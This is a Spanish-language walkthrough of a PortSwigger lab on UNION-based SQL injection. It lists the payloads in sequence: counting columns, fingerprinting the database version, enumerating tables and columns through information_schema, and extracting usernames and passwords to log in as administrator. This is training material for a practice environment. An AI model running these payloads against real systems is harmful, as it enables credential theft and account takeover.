# SQL Injection Attack - Listing Database Contents on Non-Oracle Databases

## 📌 Lab Information

- **Lab:** Listing Database Contents on Non-Oracle Databases
- **Categoría:** UNION SQL Injection

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

---

## 🎯 Objetivo

Extraer usuarios y contraseñas desde tablas internas de la base de datos.

---

## 🔍 Enumeración inicial

Determinamos columnas usando:

```sql
' ORDER BY 2 -- -
```

---

## 🔍 Identificación del motor

MySQL/Microsoft:

```sql
' union select @@version,null -- -
```

PostgreSQL:

```sql
' union select version(),null -- -
```

![Versión PostgreSQL](../../../../Imagenes/pasted-image-20260331172016.png)

---

## 🚀 Listado de tablas

```sql
' union select table_name,null from information_schema.tables -- -
```

![Listado tablas](../../../../Imagenes/pasted-image-20260331172912.png)

---

## 🔍 Tabla users

Identificamos:

```text
USERS_LETRASALEATORIAS
```

![Tabla users](../../../../Imagenes/pasted-image-20260331172948.png)

---

## 🚀 Listado de columnas

```sql
' union select column_name,null from information_schema.columns where table_name='users_LETRASALEATORIAS' -- -
```

![Columnas tabla](../../../../Imagenes/pasted-image-20260331173008.png)

---

## 🚀 Extracción de credenciales

```sql
' union select username,password from users_LETRASALEATORIAS -- -
```

![Credenciales](../../../../Imagenes/pasted-image-20260331173252.png)

---

## 🔓 Acceso administrador

![Login exitoso](../../../../Imagenes/pasted-image-20260331173338.png)

---

## ✅ Resultado

Se logró:
- Enumerar tablas
- Enumerar columnas
- Extraer credenciales
- Acceder como administrador
